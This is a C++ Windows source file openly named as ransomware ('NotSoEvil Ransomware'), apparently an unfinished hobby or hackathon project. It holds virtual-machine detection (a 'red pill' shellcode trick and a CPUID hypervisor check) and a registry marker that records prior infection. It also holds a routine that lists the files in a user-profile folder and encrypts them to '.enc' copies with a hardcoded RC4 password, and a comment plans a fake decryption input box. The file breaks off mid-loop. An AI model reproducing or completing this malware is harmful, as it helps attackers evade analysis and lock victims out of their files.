// HERansomeware.cpp : Defines the entry point for the application.
//
//cpuid stuff
#include <limits.h>
#include <intrin.h>
#include <array>
#include "stdafx.h"
#include "NotSoEvil Ransomware.h"
#include <stdio.h>
#include <windows.h>
#include <iostream>
#include <shellapi.h>
#include <vector>
#include <bitset>
#include <string>
#include <intrin.h>
#include <atlbase.h>
#include <wincrypt.h>
#include <algorithm>

#define MAX_LOADSTRING 100
#define KEYLENGTH  0x00800000
#define ENCRYPT_ALGORITHM CALG_RC4 
#define ENCRYPT_BLOCK_SIZE 8


// Global Variables:
HINSTANCE hInst;                                // current instance
WCHAR szTitle[MAX_LOADSTRING] = L"Whats up";                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name
#define VARNAME TEXT("USERPROFILE")
#define BUFSIZE 4096
bool fReturn = false;
HANDLE hSourceFile = INVALID_HANDLE_VALUE;
HANDLE hDestinationFile = INVALID_HANDLE_VALUE;

HCRYPTPROV hCryptProv = NULL;
HCRYPTKEY hKey = NULL;
HCRYPTKEY hXchgKey = NULL;
HCRYPTHASH hHash = NULL;

PBYTE pbKeyBlob = NULL;
DWORD dwKeyBlobLen;

PBYTE pbBuffer = NULL;
DWORD dwBlockLen;
DWORD dwBufferLen;
DWORD dwCount;

// Forward declarations of functions included in this code module:
ATOM                MyRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
BOOL				RunningInVm();
BOOL				RunningInVm2();
BOOL				AttackStarter();
BOOL				RegistryQuery(LPCTSTR RegGroupToQuery, LPCTSTR RegKeyToQuery);
BOOL				CryptoChecker();
BOOL				InitializeEncryption();
BOOL				InitializeDecryption();
BOOL				Exit_MyEncryptFile();
BOOL				EncryptFile(LPWSTR pszSourceFile, LPWSTR pszDestinationFile, LPWSTR pszPassword);
BOOL				DecryptFile(LPWSTR szSource, LPWSTR szDestination, LPWSTR szPassword);
BOOL				Exit_MyDecryptFile();
BOOL				ListAllFiles();
BOOL				AntiDebugMethods();
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);
	//LPWSTR str1 = L"\hackerearth";
	std::wstring loc = L"\\hackerearth\\*";
	WIN32_FIND_DATA ffd;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	// TODO: Place code here.


	//MessageBox(NULL, s, L"Environment variable", MB_OK);

	//Attacking code
	AttackStarter();


	//finding all files in the directory
	/*hFind = FindFirstFile(LPCWSTR(s), &ffd);
	do
	{
		printf("Files found.");
		MessageBox(NULL, ffd.cFileName, L"Files in the directory", MB_OK);

	} while (FindNextFile(hFind, &ffd) != 0);*/







	//code to parse commandline parameters
	LPWSTR *szArgList;
	int argCount;
	szArgList = CommandLineToArgvW(GetCommandLine(), &argCount);
	if (szArgList == NULL) {
		MessageBox(NULL, L"Unable to parse command line", L"Error", MB_OK);
		return 10;
	}
	for (int i = 0; i < argCount; i++)
	{
		printf("arglist content");
		//MessageBox(NULL, szArgList[i], L"Arglist contents", MB_OK);
	}
	LocalFree(szArgList);


	//MessageBox(NULL, L"VM code is gone", L"Goen gone gone", MB_OK);
	// printing checker (delete later)
	printf("Hello world");
	_tprintf(
		TEXT("The source plaintext file is open. \n"));

	// Initialize global strings
	LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadStringW(hInstance, IDC_NOTSOEVILRANSOMWARE, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// Perform application initialization:
	if (!InitInstance(hInstance, nCmdShow))
	{
		return FALSE;
	}

	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_NOTSOEVILRANSOMWARE));

	MSG msg;

	// Main message loop:
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int)msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEXW wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = WndProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDC_NOTSOEVILRANSOMWARE));
	wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_NOTSOEVILRANSOMWARE);
	wcex.lpszClassName = szWindowClass;
	wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassExW(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
	hInst = hInstance; // Store instance handle in our global variable

	HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

	if (!hWnd)
	{
		return FALSE;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE: Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_COMMAND:
	{
		int wmId = LOWORD(wParam);
		// Parse the menu selections:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
	}
	break;
	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hWnd, &ps);
		// TODO: Add any drawing code that uses hdc here...
		EndPaint(hWnd, &ps);
	}
	break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}



BOOL RunningInVm()
{

	unsigned char m[2 + 4], rpill[] = "\x0f\x01\x0d\x00\x00\x00\x00\xc3";
	*((unsigned*)&rpill[3]) = (unsigned)m;
	((void(*)())&rpill)();
	if ((m[5] > 0xd0) ? 1 : 0) {
		return TRUE;
	}
	else {
		return FALSE;
	}


}

BOOL RunningInVm2() {
	unsigned int cpuInfo[4];
	__cpuid((int*)cpuInfo, 1);
	if (((cpuInfo[2] >> 31) & 1) == 1) {
		return TRUE;
	}
	else {
		return FALSE;
	}
}

BOOL AttackStarter() {
	//Vm dectection code
	int a;
	if (RunningInVm2()) {
		MessageBox(NULL, L"Running in VM", L"Running inside VM", MB_OK);
	}
	else {
		MessageBox(NULL, L"Not Running in VM", L"Not Running inside VM", MB_OK);
	}

	//useless code obfuscation
	/*a = 10;
	if (a < 100) {
		for (int i = 0; i < 20; i++) {
			a = a * i;
			if (RunningInVm2()) {
				MessageBox(NULL, L"Running in VM", L"Running inside VM", MB_OK);
			}
			else {
				MessageBox(NULL, L"Not Running in VM", L"Not Running inside VM", MB_OK);
			}
		}
	}*/
	CryptoChecker();

	return 0;
}

BOOL CryptoChecker() {
	//Query if the key exist. If exist then we have already encrypted the files in the system.
	BOOL AlreadyInfected = RegistryQuery(L"Software\\Microsoft\\Windows\\CurrentVersion\\ContentDeliveryManager", L"PostInstalledAppsDisable");
	if (AlreadyInfected) {
		//Run the decryptor
		MessageBox(NULL, L"Already infected system", L"Already infected system", MB_OK);
	}
	else {
		//Run the encryptor
		MessageBox(NULL, L"Running the encryptor", L"encryption is running", MB_OK);
		ListAllFiles();
		//DecryptFile((LPWSTR)pszSourceFile.c_str(), (LPWSTR)pszDestinationFile.c_str(), (LPWSTR)pszPassword.c_str());
	}
	return 0;
}

BOOL RegistryQuery(LPCTSTR RegGroupToQuery, LPCTSTR RegKeyToQuery) {


	CRegKey regKey;
	DWORD   dwValue = 0;

	if (ERROR_SUCCESS != regKey.Open(HKEY_CURRENT_USER, RegGroupToQuery))
	{

		MessageBox(NULL, L"Value not found", L"Regitery group  not found", MB_OK);

	}
	else {
		MessageBox(NULL, L"Value found", L"Regitery group found", MB_OK);
	}
	if (ERROR_SUCCESS != regKey.QueryDWORDValue(RegKeyToQuery, dwValue))
	{

		regKey.Close();
		MessageBox(NULL, L"Value not found", L"Regitery key  not found", MB_OK);

		return 0;
	}
	else {
		regKey.Close();
		MessageBox(NULL, L"Value found", L"Regitery key found", MB_OK);
		return 1;
	}

	return 0;
}

BOOL InitializeEncryption() {
	//if argv[1] = 2 is given then encrypt using registry value. If argv[1] is not given then encrypt using random key.Save it in enviornment variable.
	LPWSTR *szArgList;
	int argCount;
	szArgList = CommandLineToArgvW(GetCommandLine(), &argCount);
	if (szArgList == NULL) {
		MessageBox(NULL, L"Unable to parse command line", L"Error", MB_OK);
		return 10;
	}
	if (argCount == 1) {
		//use random value for encryption and save it in env.

	}
	else if (argCount == 2) {
		//use the registry key to encrypt. and check it throught the algo. If fail then go to random value encryption.

	}
	for (int i = 0; i < argCount; i++)
	{
		printf("arglist content");
		//MessageBox(NULL, szArgList[i], L"Arglist contents", MB_OK);

	}
	LocalFree(szArgList);

	std::wstring pszSourceFile = L"C:\\Users\\Trisha\\hackerearth\\rcEncrypt";
	std::wstring pszDestinationFile = L"C:\\Users\\Trisha\\hackerearth\\new.exe";
	std::wstring pszPassword = L"q2weAV";
	// wstring to LPWSTR -> LPWSTR s = (LPWSTR)w3.c_str();
	//EncryptFile((LPWSTR)pszSourceFile.c_str(), (LPWSTR)pszDestinationFile.c_str(), (LPWSTR)pszPassword.c_str() );
	DecryptFile((LPWSTR)pszSourceFile.c_str(), (LPWSTR)pszDestinationFile.c_str(), (LPWSTR)pszPassword.c_str());
	return 0;
}

BOOL InitializeDecryption() {
	//For decryption use only registry key.
	//
	//put a fake input box which actually do nothing.
	//when user put the key in text box check the registry value.

	return 0;
}


BOOL EncryptionFunction() {
	LPTSTR key;
	return 0;

}

BOOL EncryptFile(
	LPWSTR pszSourceFile,
	LPWSTR pszDestinationFile,
	LPWSTR pszPassword)
{
	//---------------------------------------------------------------
	// Declare and initialize local variables.
	bool fReturn = false;
	HANDLE hSourceFile = INVALID_HANDLE_VALUE;
	HANDLE hDestinationFile = INVALID_HANDLE_VALUE;

	HCRYPTPROV hCryptProv = NULL;
	HCRYPTKEY hKey = NULL;
	HCRYPTKEY hXchgKey = NULL;
	HCRYPTHASH hHash = NULL;

	PBYTE pbKeyBlob = NULL;
	DWORD dwKeyBlobLen;

	PBYTE pbBuffer = NULL;
	DWORD dwBlockLen;
	DWORD dwBufferLen;
	DWORD dwCount;

	//---------------------------------------------------------------
	// Open the source file. 
	hSourceFile = CreateFile(
		pszSourceFile,
		FILE_READ_DATA,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (INVALID_HANDLE_VALUE != hSourceFile)
	{
		_tprintf(
			TEXT("The source plaintext file, %s, is open. \n"),
			pszSourceFile);
	}
	else
	{
		// error opening plaintext file
		MessageBox(NULL, L"Error", L"error opening plaintext file", MB_OK);
		Exit_MyEncryptFile();
	}

	//---------------------------------------------------------------
	// Open the destination file. 
	hDestinationFile = CreateFile(
		pszDestinationFile,
		FILE_WRITE_DATA,
		FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (INVALID_HANDLE_VALUE != hDestinationFile)
	{
		_tprintf(
			TEXT("The destination file, %s, is open. \n"),
			pszDestinationFile);
	}
	else
	{
		//error opening destination file
		MessageBox(NULL, L"Error", L"error opening destination file", MB_OK);
		Exit_MyEncryptFile();
	}

	//---------------------------------------------------------------
	// Get the handle to the default provider. 
	if (CryptAcquireContext(
		&hCryptProv,
		NULL,
		MS_ENHANCED_PROV,
		PROV_RSA_FULL,
		0))
	{
		_tprintf(
			TEXT("A cryptographic provider has been acquired. \n"));
	}
	else
	{
		//error during cryptacquirecontext
		MessageBox(NULL, L"Error", L"error during cryptacquirecontext", MB_OK);
		Exit_MyEncryptFile();
	}

	//---------------------------------------------------------------
	// Create the session key.
	if (!pszPassword || !pszPassword[0])
	{
		//-----------------------------------------------------------
		// No password was passed.
		// Encrypt the file with a random session key, and write the 
		// key to a file. 

		//-----------------------------------------------------------
		// Create a random session key. 
		if (CryptGenKey(
			hCryptProv,
			ENCRYPT_ALGORITHM,
			KEYLENGTH | CRYPT_EXPORTABLE,
			&hKey))
		{
			_tprintf(TEXT("A session key has been created. \n"));
		}
		else
		{
			//error during cryptgenkey
			MessageBox(NULL, L"Error", L"error during cryptgenkey", MB_OK);
			Exit_MyEncryptFile();
		}

		//-----------------------------------------------------------
		// Get the handle to the exchange public key. 
		if (CryptGetUserKey(
			hCryptProv,
			AT_KEYEXCHANGE,
			&hXchgKey))
		{
			_tprintf(
				TEXT("The user public key has been retrieved. \n"));
		}
		else
		{
			if (NTE_NO_KEY == GetLastError())
			{
				// No exchange key exists. Try to create one.
				if (!CryptGenKey(
					hCryptProv,
					AT_KEYEXCHANGE,
					CRYPT_EXPORTABLE,
					&hXchgKey))
				{
					//could not create a user public key
					MessageBox(NULL, L"Error", L"could not create a user public key", MB_OK);
					Exit_MyEncryptFile();
				}
			}
			else
			{
				//user private key in not available and may not exist.
				MessageBox(NULL, L"Error", L"user private key in not available and may not exist.", MB_OK);
				Exit_MyEncryptFile();
			}
		}

		//-----------------------------------------------------------
		// Determine size of the key BLOB, and allocate memory. 
		if (CryptExportKey(
			hKey,
			hXchgKey,
			SIMPLEBLOB,
			0,
			NULL,
			&dwKeyBlobLen))
		{
			_tprintf(
				TEXT("The key BLOB is %d bytes long. \n"),
				dwKeyBlobLen);
		}
		else
		{
			//error computing blob length
			MessageBox(NULL, L"Error", L"error computing blob length.", MB_OK);
			Exit_MyEncryptFile();
		}

		if (pbKeyBlob = (BYTE *)malloc(dwKeyBlobLen))
		{
			_tprintf(
				TEXT("Memory is allocated for the key BLOB. \n"));
		}
		else
		{
			//out of memory
			MessageBox(NULL, L"Error", L"out of memory.", MB_OK);
			Exit_MyEncryptFile();
		}

		//-----------------------------------------------------------
		// Encrypt and export the session key into a simple key 
		// BLOB. 
		if (CryptExportKey(
			hKey,
			hXchgKey,
			SIMPLEBLOB,
			0,
			pbKeyBlob,
			&dwKeyBlobLen))
		{
			_tprintf(TEXT("The key has been exported. \n"));
		}
		else
		{
			//error during cryptexportkey
			MessageBox(NULL, L"Error", L"error during cryptexportkey.", MB_OK);
			Exit_MyEncryptFile();
		}

		//-----------------------------------------------------------
		// Release the key exchange key handle. 
		if (hXchgKey)
		{
			if (!(CryptDestroyKey(hXchgKey)))
			{
				//error in CryptDestroyKey
				MessageBox(NULL, L"Error", L"error in cryptdestroykey.", MB_OK);
				Exit_MyEncryptFile();
			}

			hXchgKey = 0;
		}

		//-----------------------------------------------------------
		// Write the size of the key BLOB to the destination file. 
		if (!WriteFile(
			hDestinationFile,
			&dwKeyBlobLen,
			sizeof(DWORD),
			&dwCount,
			NULL))
		{
			//error writing header
			MessageBox(NULL, L"Error", L"error writing header.", MB_OK);

			Exit_MyEncryptFile();
		}
		else
		{
			_tprintf(TEXT("A file header has been written. \n"));
		}

		//-----------------------------------------------------------
		// Write the key BLOB to the destination file. 
		if (!WriteFile(
			hDestinationFile,
			pbKeyBlob,
			dwKeyBlobLen,
			&dwCount,
			NULL))
		{
			//error writing header.
			MessageBox(NULL, L"Error", L"error writing header.", MB_OK);
			Exit_MyEncryptFile();
		}
		else
		{
			_tprintf(
				TEXT("The key BLOB has been written to the ")
				TEXT("file. \n"));
		}

		// Free memory.
		free(pbKeyBlob);
	}
	else
	{

		//-----------------------------------------------------------
		// The file will be encrypted with a session key derived 
		// from a password.
		// The session key will be recreated when the file is 
		// decrypted only if the password used to create the key is 
		// available. 

		//-----------------------------------------------------------
		// Create a hash object. 
		if (CryptCreateHash(
			hCryptProv,
			CALG_MD5,
			0,
			0,
			&hHash))
		{
			_tprintf(TEXT("A hash object has been created. \n"));
		}
		else
		{
			//error during cryptCreateHash
			MessageBox(NULL, L"Error", L"error during cryptCreateHash.", MB_OK);
			Exit_MyEncryptFile();
		}

		//-----------------------------------------------------------
		// Hash the password. 
		if (CryptHashData(
			hHash,
			(BYTE *)pszPassword,
			lstrlen(pszPassword),
			0))
		{
			_tprintf(
				TEXT("The password has been added to the hash. \n"));
		}
		else
		{
			//Error during crypthashdata
			MessageBox(NULL, L"Error", L"error during crypthashdata.", MB_OK);
			Exit_MyEncryptFile();
		}

		//-----------------------------------------------------------
		// Derive a session key from the hash object. 
		if (CryptDeriveKey(
			hCryptProv,
			ENCRYPT_ALGORITHM,
			hHash,
			KEYLENGTH,
			&hKey))
		{
			_tprintf(
				TEXT("An encryption key is derived from the ")
				TEXT("password hash. \n"));
		}
		else
		{
			//error during cryptderivekey
			MessageBox(NULL, L"Error", L"error during cryptderivekey.", MB_OK);
			Exit_MyEncryptFile();
		}
	}

	//---------------------------------------------------------------
	// The session key is now ready. If it is not a key derived from 
	// a  password, the session key encrypted with the private key 
	// has been written to the destination file.

	//---------------------------------------------------------------
	// Determine the number of bytes to encrypt at a time. 
	// This must be a multiple of ENCRYPT_BLOCK_SIZE.
	// ENCRYPT_BLOCK_SIZE is set by a #define statement.
	dwBlockLen = 1000 - 1000 % ENCRYPT_BLOCK_SIZE;

	//---------------------------------------------------------------
	// Determine the block size. If a block cipher is used, 
	// it must have room for an extra block. 
	if (ENCRYPT_BLOCK_SIZE > 1)
	{
		dwBufferLen = dwBlockLen + ENCRYPT_BLOCK_SIZE;
	}
	else
	{
		dwBufferLen = dwBlockLen;
	}

	//---------------------------------------------------------------
	// Allocate memory. 
	if (pbBuffer = (BYTE *)malloc(dwBufferLen))
	{
		_tprintf(
			TEXT("Memory has been allocated for the buffer. \n"));
	}
	else
	{
		//out of memory
		MessageBox(NULL, L"Error", L"out of memory.", MB_OK);
		Exit_MyEncryptFile();
	}

	//---------------------------------------------------------------
	// In a do loop, encrypt the source file, 
	// and write to the source file. 
	bool fEOF = FALSE;
	do
	{
		//-----------------------------------------------------------
		// Read up to dwBlockLen bytes from the source file. 
		if (!ReadFile(
			hSourceFile,
			pbBuffer,
			dwBlockLen,
			&dwCount,
			NULL))
		{
			//error reading plaintext
			MessageBox(NULL, L"Error", L"error reading plaintext.", MB_OK);
			Exit_MyEncryptFile();
		}

		if (dwCount < dwBlockLen)
		{
			fEOF = TRUE;
		}

		//-----------------------------------------------------------
		// Encrypt data. 
		if (!CryptEncrypt(
			hKey,
			NULL,
			fEOF,
			0,
			pbBuffer,
			&dwCount,
			dwBufferLen))
		{
			//error during cryptencrypt.
			MessageBox(NULL, L"Error", L"error during cryptencrypt.", MB_OK);
			Exit_MyEncryptFile();
		}

		//-----------------------------------------------------------
		// Write the encrypted data to the destination file. 
		if (!WriteFile(
			hDestinationFile,
			pbBuffer,
			dwCount,
			&dwCount,
			NULL))
		{
			//eerror writing ciphertext
			MessageBox(NULL, L"Error", L"error writing ciphertext.", MB_OK);
			Exit_MyEncryptFile();
		}

		//-----------------------------------------------------------
		// End the do loop when the last block of the source file 
		// has been read, encrypted, and written to the destination 
		// file.
	} while (!fEOF);

	return 0;
}

BOOL Exit_MyEncryptFile() {
	//---------------------------------------------------------------
	// Close files.
	if (hSourceFile)
	{
		CloseHandle(hSourceFile);
	}

	if (hDestinationFile)
	{
		CloseHandle(hDestinationFile);
	}

	//---------------------------------------------------------------
	// Free memory. 
	if (pbBuffer)
	{
		free(pbBuffer);
	}


	//-----------------------------------------------------------
	// Release the hash object. 
	if (hHash)
	{
		if (!(CryptDestroyHash(hHash)))
		{
			//error during cryptdestroyhash
			MessageBox(NULL, L"Error", L"error during cryptdestroyhash.", MB_OK);

		}

		hHash = NULL;
	}

	//---------------------------------------------------------------
	// Release the session key. 
	if (hKey)
	{
		if (!(CryptDestroyKey(hKey)))
		{
			//error during cryptdestroykey
			MessageBox(NULL, L"Error", L"error during cryptdestroykey.", MB_OK);
		}
	}

	//---------------------------------------------------------------
	// Release the provider handle. 
	if (hCryptProv)
	{
		if (!(CryptReleaseContext(hCryptProv, 0)))
		{
			//error dring cryptreleasecontext
			MessageBox(NULL, L"Error", L"error during cryptreleasecontext.", MB_OK);
		}
	}

	return fReturn;
} // End Encryptfile.


BOOL DecryptFile(
	LPWSTR pszSourceFile,
	LPWSTR pszDestinationFile,
	LPWSTR pszPassword)
{
	//---------------------------------------------------------------
	// Declare and initialize local variables.
	bool fReturn = false;
	HANDLE hSourceFile = INVALID_HANDLE_VALUE;
	HANDLE hDestinationFile = INVALID_HANDLE_VALUE;
	HCRYPTKEY hKey = NULL;
	HCRYPTHASH hHash = NULL;

	HCRYPTPROV hCryptProv = NULL;

	DWORD dwCount;
	PBYTE pbBuffer = NULL;
	DWORD dwBlockLen;
	DWORD dwBufferLen;

	//---------------------------------------------------------------
	// Open the source file. 
	hSourceFile = CreateFile(
		pszSourceFile,
		FILE_READ_DATA,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (INVALID_HANDLE_VALUE != hSourceFile)
	{
		_tprintf(
			TEXT("The source encrypted file, %s, is open. \n"),
			pszSourceFile);
	}
	else
	{
		//Error opening source encrypted file

		Exit_MyDecryptFile();
	}

	//---------------------------------------------------------------
	// Open the destination file. 
	hDestinationFile = CreateFile(
		pszDestinationFile,
		FILE_WRITE_DATA,
		FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (INVALID_HANDLE_VALUE != hDestinationFile)
	{
		_tprintf(
			TEXT("The destination file, %s, is open. \n"),
			pszDestinationFile);
	}
	else
	{
		//error opening destinantion file.
		Exit_MyDecryptFile();
	}

	//---------------------------------------------------------------
	// Get the handle to the default provider. 
	if (CryptAcquireContext(
		&hCryptProv,
		NULL,
		MS_ENHANCED_PROV,
		PROV_RSA_FULL,
		0))
	{
		_tprintf(
			TEXT("A cryptographic provider has been acquired. \n"));
	}
	else
	{
		//error during cryptacquirecontext

		Exit_MyDecryptFile();
	}

	//---------------------------------------------------------------
	// Create the session key.
	if (!pszPassword || !pszPassword[0])
	{
		//-----------------------------------------------------------
		// Decrypt the file with the saved session key. 

		DWORD dwKeyBlobLen;
		PBYTE pbKeyBlob = NULL;

		// Read the key BLOB length from the source file. 
		if (!ReadFile(
			hSourceFile,
			&dwKeyBlobLen,
			sizeof(DWORD),
			&dwCount,
			NULL))
		{
			//error reading key BLOB length
			Exit_MyDecryptFile();
		}

		// Allocate a buffer for the key BLOB.
		if (!(pbKeyBlob = (PBYTE)malloc(dwKeyBlobLen)))
		{
			//memory allocation error.
			Exit_MyDecryptFile();
		}

		//-----------------------------------------------------------
		// Read the key BLOB from the source file. 
		if (!ReadFile(
			hSourceFile,
			pbKeyBlob,
			dwKeyBlobLen,
			&dwCount,
			NULL))
		{
			//error reading key blob length

			Exit_MyDecryptFile();
		}

		//-----------------------------------------------------------
		// Import the key BLOB into the CSP. 
		if (!CryptImportKey(
			hCryptProv,
			pbKeyBlob,
			dwKeyBlobLen,
			0,
			0,
			&hKey))
		{
			//error during cryptimportkey

			Exit_MyDecryptFile();
		}

		if (pbKeyBlob)
		{
			free(pbKeyBlob);
		}
	}
	else
	{
		//-----------------------------------------------------------
		// Decrypt the file with a session key derived from a 
		// password. 

		//-----------------------------------------------------------
		// Create a hash object. 
		if (!CryptCreateHash(
			hCryptProv,
			CALG_MD5,
			0,
			0,
			&hHash))
		{
			//error during cryptcreatehash
			Exit_MyDecryptFile();
		}

		//-----------------------------------------------------------
		// Hash in the password data. 
		if (!CryptHashData(
			hHash,
			(BYTE *)pszPassword,
			lstrlen(pszPassword),
			0))
		{
			//error during crypthashdata
			Exit_MyDecryptFile();
		}

		//-----------------------------------------------------------
		// Derive a session key from the hash object. 
		if (!CryptDeriveKey(
			hCryptProv,
			ENCRYPT_ALGORITHM,
			hHash,
			KEYLENGTH,
			&hKey))
		{
			//error during cryptderivekey
			Exit_MyDecryptFile();
		}
	}

	//---------------------------------------------------------------
	// The decryption key is now available, either having been 
	// imported from a BLOB read in from the source file or having 
	// been created by using the password. This point in the program 
	// is not reached if the decryption key is not available.

	//---------------------------------------------------------------
	// Determine the number of bytes to decrypt at a time. 
	// This must be a multiple of ENCRYPT_BLOCK_SIZE. 

	dwBlockLen = 1000 - 1000 % ENCRYPT_BLOCK_SIZE;
	dwBufferLen = dwBlockLen;

	//---------------------------------------------------------------
	// Allocate memory for the file read buffer. 
	if (!(pbBuffer = (PBYTE)malloc(dwBufferLen)))
	{
		//out of memory
		Exit_MyDecryptFile();
	}

	//---------------------------------------------------------------
	// Decrypt the source file, and write to the destination file. 
	bool fEOF = false;
	do
	{
		//-----------------------------------------------------------
		// Read up to dwBlockLen bytes from the source file. 
		if (!ReadFile(
			hSourceFile,
			pbBuffer,
			dwBlockLen,
			&dwCount,
			NULL))
		{
			//error reading from source file
			Exit_MyDecryptFile();
		}

		if (dwCount <= dwBlockLen)
		{
			fEOF = TRUE;
		}

		//-----------------------------------------------------------
		// Decrypt the block of data. 
		if (!CryptDecrypt(
			hKey,
			0,
			fEOF,
			0,
			pbBuffer,
			&dwCount))
		{
			//error during cryptdecrypt
			Exit_MyDecryptFile();
		}

		//-----------------------------------------------------------
		// Write the decrypted data to the destination file. 
		if (!WriteFile(
			hDestinationFile,
			pbBuffer,
			dwCount,
			&dwCount,
			NULL))
		{
			//error writing ciphertext
			Exit_MyDecryptFile();
		}

		//-----------------------------------------------------------
		// End the do loop when the last block of the source file 
		// has been read, encrypted, and written to the destination 
		// file.
	} while (!fEOF);

	return 0;
}

BOOL Exit_MyDecryptFile() {

	//---------------------------------------------------------------
	// Free the file read buffer.
	if (pbBuffer)
	{
		free(pbBuffer);
	}

	//---------------------------------------------------------------
	// Close files.
	if (hSourceFile)
	{
		CloseHandle(hSourceFile);
	}

	if (hDestinationFile)
	{
		CloseHandle(hDestinationFile);
	}

	//-----------------------------------------------------------
	// Release the hash object. 
	if (hHash)
	{
		if (!(CryptDestroyHash(hHash)))
		{
			//error during cryptdestroyhash

		}

		hHash = NULL;
	}

	//---------------------------------------------------------------
	// Release the session key. 
	if (hKey)
	{
		if (!(CryptDestroyKey(hKey)))
		{
			//error during cryptdestroykey

		}
	}

	//---------------------------------------------------------------
	// Release the provider handle. 
	if (hCryptProv)
	{
		if (!(CryptReleaseContext(hCryptProv, 0)))
		{
			//error during cryptreleasecontext

		}
	}

	return fReturn;
}

BOOL ListAllFiles() {
	LPWSTR pszOldVal;
	DWORD dwRet, dwErr;
	BOOL fExist;
	WIN32_FIND_DATA ffd;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	std::wstring loc = L"\\hackerearth\\*";
	pszOldVal = (LPWSTR)malloc(BUFSIZE * sizeof(TCHAR));
	dwRet = GetEnvironmentVariable(VARNAME, pszOldVal, BUFSIZE);
	if (0 == dwRet)
	{
		dwErr = GetLastError();
		if (ERROR_ENVVAR_NOT_FOUND == dwErr)
		{
			printf("Environment variable does not exist.\n");
			MessageBox(NULL, L"Env variable doesn't exist", L"Environment variable", MB_OK);
			fExist = FALSE;
		}

	}

	std::wstring w1(pszOldVal);
	std::wstring w2(loc);
	std::wstring PathOfDir = w1 + w2;
	std::wstring pszPassword = L"q2weAV";
	hFind = FindFirstFile((LPCWSTR)PathOfDir.c_str(), &ffd);
	PathOfDir.resize(PathOfDir.size() - 1);
	MessageBox(NULL, (LPCWSTR)PathOfDir.c_str(), L"path of dir", MB_OK);
	do
	{
		printf("Files found.");
		MessageBox(NULL, ffd.cFileName, L"Files in the directory", MB_OK);

		std::wstring filename = ffd.cFileName;

		std::wstring fullPathToFile = PathOfDir + ffd.cFileName;
		std::wstring pszDestinationFile = PathOfDir + ffd.cFileName + L".enc";
		if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) {
			MessageBox(NULL, (LPCWSTR)ffd.cFileName, L"Unknown file found", MB_OK);
		}
		else {
		MessageBox(NULL, (LPCWSTR)fullPathToFile.c_str(), L"Full path of file", MB_OK);
		// wstring to LPWSTR -> LPWSTR s = (LPWSTR)w3.c_str();
